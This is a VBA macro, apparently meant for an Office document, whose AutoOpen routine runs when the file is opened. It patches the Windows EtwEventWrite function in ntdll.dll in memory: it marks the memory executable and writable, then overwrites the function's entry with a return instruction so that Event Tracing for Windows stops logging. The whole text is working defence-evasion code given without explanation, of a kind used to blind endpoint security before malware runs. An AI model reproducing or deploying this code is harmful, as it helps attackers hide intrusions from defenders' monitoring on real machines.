Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)


Sub AutoOpen()

    Dim ntdllDLL As LongPtr
    Dim EtwEventWriteAddr As LongPtr
    Dim result As Long
    Dim MyByteArray(6) As Byte
    Dim ArrayPointer As LongPtr

    #If Win64 Then
        MyByteArray(0) = 195 ' 0xC3
    #Else
        MyByteArray(0) = 194 ' 0xC2
        MyByteArray(1) = 20 ' 0x14
        MyByteArray(2) = 0 ' 0x00
        MyByteArray(3) = 0 ' 0x00
    #End If
    

    ntdllDLL = LoadLibrary("ntdll.dll")
    EtwEventWriteAddr = GetProcAddress(ntdllDLL, "EtwEventWrite")
    
    #If Win64 Then

        result = VirtualProtect(ByVal EtwEventWriteAddr, 1, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        CopyMemory ByVal EtwEventWriteAddr, ByVal ArrayPointer, 1
    #Else
        result = VirtualProtect(ByVal EtwEventWriteAddr, 4, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        CopyMemory ByVal EtwEventWriteAddr, ByVal ArrayPointer, 4
    #End If

End Sub

